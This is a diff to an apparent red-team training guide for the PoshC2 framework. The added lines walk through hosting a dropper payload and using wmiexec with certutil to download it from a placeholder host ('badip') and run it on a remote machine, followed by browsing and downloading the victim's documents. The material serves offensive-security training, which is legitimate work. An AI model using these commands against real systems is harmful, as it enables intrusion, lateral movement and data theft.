@@ -1,14 +1,15 @@
 # CTE-For-Monkeys
 
-- poshc2 
-	- set up
+- Running Poshc2 
+	- Set up
 	- tool familierization 
 		- hosting payload
 		- file upload 
 		- host enumeration 
 		- user escelation
-		- file download
+		- persistence / scripting
 		- later movement
+        - file download
 - living of the land ( windows )
 	- file downloads 
 	- file (payload) execution 
@@ -160,5 +161,48 @@ Now lets run a `sharpview` to enumerate the network to conduct lateral movement
 sharpview 
 ```
 > Read more on sharpview [here](https://academy.hackthebox.com/course/preview/active-directory-powerview/powerviewsharpview-overview--usage)
+
+We can us the enumeration script to identify the next workstation to laterally move to 
+
+```
+resolveip <127.0.0.1>
+```
+
+Lets host a new payload 
+```
+add-hosted-file
+```
+
+Host file opttions 
+```
+file location > /var/poshc2/projectname/payloads/Sharp_v4_dropper_x64.exe
+file uri > /verify
+file MIME type > text/html
+Base64 > n
+```
+
+Run wimc to get download and execution of hosted payload
+```
+wmiexec <127.0.0.1> <domain> <username> password=asdsa "cmd /c certutil.e xe -urlcache -split -f http://badip/verify C:\windows\downloads\bad2.exe && C:\windows\downloads\bad2.exe"
+```
+
+In ImplantHandler interact with the new payload 
+
+In the new payload handler lets navigate to the `documents` folder 
+```
+cd C:\users\username\documents
+```
+
+lets see what documents we can find 
+```
+ls
+```
+
+Now lets download some files 
+```
+download-file <filename>
+```
+
+Congragulations you have ran through your first OPPLAN, check [here](poshC2_help_v8.md) for the help list for poshc2 and other commands you can run.
 
 
